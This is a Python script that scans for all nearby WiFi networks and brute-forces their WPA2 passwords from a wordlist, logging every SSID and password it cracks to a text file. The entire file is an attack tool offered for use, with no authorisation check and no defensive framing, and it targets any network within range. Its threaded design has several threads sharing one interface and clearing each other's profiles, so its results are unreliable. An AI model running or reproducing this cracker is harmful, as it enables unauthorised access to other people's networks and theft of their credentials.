import time
import threading
from pywifi import const, Profile, PyWiFi
from concurrent.futures import ThreadPoolExecutor

# Function to read the password list from a text file
def read_password_list(password_list_file):
    encodings = ["utf-8", "ISO-8859-1", "latin-1", "cp1252"]

    for encoding in encodings:
        try:
            with open(password_list_file, "r", encoding=encoding) as file:
                password_list = file.read().splitlines()
                return password_list
        except Exception as e:
            continue

    print("Error reading the password list. Please ensure it's in a readable format.")
    return []

# Attempt to connect to a WiFi network with a given password
def connect_to_wifi(ssid, password, iface):
    wifi = PyWiFi()
    profile = Profile()
    profile.ssid = ssid
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    iface.remove_all_network_profiles()  # Clear existing profiles
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    # Wait for the connection to establish and check if it's successful
    for _ in range(10):
        time.sleep(3)
        if iface.status() == const.IFACE_CONNECTED:
            print(f"Connected to {ssid} with password: {password}")
            log_successful_connection(ssid, password)
            return
    print(f"Failed to connect to {ssid} with password: {password}")

# Log successful connections to a file
def log_successful_connection(ssid, password):
    with open("successful_connections.txt", "a", encoding="utf-8") as file:
        file.write(f"SSID: {ssid}, Password: {password}\n")

# Scan for available WiFi networks and attempt to connect with a list of passwords
def scan_and_attempt_connections(password_list_file):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]  # You can iterate through all available interfaces

    iface.scan()
    time.sleep(2)  # Wait for scan results

    scan_results = iface.scan_results()
    password_list = read_password_list(password_list_file)  # Read the password list

    with ThreadPoolExecutor(max_workers=5) as executor:
        for result in scan_results:
            ssid = result.ssid
            print(f"Attempting to connect to {ssid}...")

            for password in password_list:
                executor.submit(connect_to_wifi, ssid, password, iface)

if __name__ == "__main__":
    password_list_file = r'C:\Users\admin\Downloads\a.txt'  # Update with the correct path to your password list file
    scan_and_attempt_connections(password_list_file)
